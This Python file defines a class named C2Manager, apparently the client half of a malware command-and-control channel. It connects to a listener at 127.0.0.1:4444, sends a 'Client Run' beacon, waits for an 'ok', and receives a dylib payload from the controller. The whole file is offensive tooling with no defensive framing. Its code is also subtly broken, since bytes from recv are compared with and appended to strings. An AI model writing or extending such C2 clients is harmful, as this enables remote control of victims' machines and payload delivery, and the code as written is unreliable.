import socket

class C2Manager:

    def __init__(self):
        self.__C2Sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__Server = "127.0.0.1"
        self.__Port = 4444

    def Run(self):
        try:
            self.__C2Sock.connect((self.__Server, self.__Port))  # throws
        except OSError as error:
            print("[~] C2Manager.Run error: {}".format(error))
            return False

        self.__notify()  # notify server

        if self.C2ManReceive() != "ok":
            return False

        return True


    def C2ManReceive(self):
        buffer = self.__C2Sock.recv(1024)  # does not throw !
        return buffer

    def C2ManSend(self, log):
        self.__C2Sock.sendall(log.encode("ascii"))  # does not throw !

    def GetFileContent(self):
        dylib_data = ""
        while True:
            buffer = self.__C2Sock.recv(1024)
            if not buffer:
                break
            dylib_data += buffer
        return dylib_data

    def __notify(self):
        self.C2ManSend("Client Run")

    def DoAck(self):
        self.C2ManSend("ok")